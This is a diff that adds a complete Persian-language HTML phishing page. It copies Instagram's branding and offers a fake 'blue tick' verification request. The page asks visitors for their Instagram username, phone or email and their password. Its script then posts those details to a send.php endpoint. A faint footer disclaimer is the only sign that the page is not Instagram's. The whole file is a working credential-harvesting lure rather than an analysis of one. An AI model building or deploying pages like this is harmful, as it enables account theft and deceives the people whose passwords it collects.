@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>درخواست تیک آبی اینستاگرام</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #121212;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #e0e0e0;
+        }
+
+        .container {
+            width: 350px;
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 3px;
+            padding: 20px 40px;
+            text-align: center;
+        }
+
+        .logo {
+            margin: 20px 0;
+            width: 175px;
+        }
+
+        .form-group {
+            margin-bottom: 10px;
+            text-align: right;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #555;
+            border-radius: 3px;
+            background-color: #2c2c2c;
+            font-size: 14px;
+            box-sizing: border-box;
+            color: #e0e0e0;
+        }
+
+        input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+
+        #submit-btn {
+            width: 100%;
+            padding: 8px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        #submit-btn:hover {
+            background-color: #0077cc;
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        .success {
+            color: green;
+            display: none;
+        }
+
+        .error {
+            color: red;
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <img src="Images/Insta Logo.png" alt="Instagram"
+            class="logo">
+        <h2>درخواست تیک آبی</h2>
+        <p>لطفا اطلاعات حساب خود را برای بررسی تیک آبی وارد کنید</p>
+
+        <div class="form-group">
+            <input type="text" id="username" placeholder="نام کاربری، شماره موبایل یا ایمیل" required>
+        </div>
+
+        <div class="form-group">
+            <input type="password" id="password" placeholder="رمز عبور" required>
+        </div>
+
+        <button id="submit-btn">تایید و ارسال درخواست</button>
+
+        <p class="success" id="success-msg">درخواست شما با موفقیت ارسال شد!</p>
+        <p class="error" id="error-msg">خطا در ارسال اطلاعات. لطفا دوباره تلاش کنید.</p>
+
+        <div class="footer">
+            <p>این صفحه رسمی اینستاگرام نیست. اطلاعات شما فقط برای بررسی تیک آبی استفاده می‌شود.</p>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        document.getElementById('submit-btn').addEventListener('click', function () {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (!username || !password) {
+                alert('لطفا نام کاربری و رمز عبور را وارد کنید');
+                return;
+            }
+
+            axios.post('send.php', new URLSearchParams({ username, password }))
+                .then(response => {
+                    if (response.data.ok) {
+                        document.getElementById('success-msg').style.display = 'block';
+                        document.getElementById('error-msg').style.display = 'none';
+                    } else {
+                        document.getElementById('error-msg').style.display = 'block';
+                        document.getElementById('success-msg').style.display = 'none';
+                        console.log('API Error:', response.data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('error-msg').style.display = 'block';
+                    document.getElementById('success-msg').style.display = 'none';
+                });
+        });
+    </script>
+
+</body>
+
+</html>
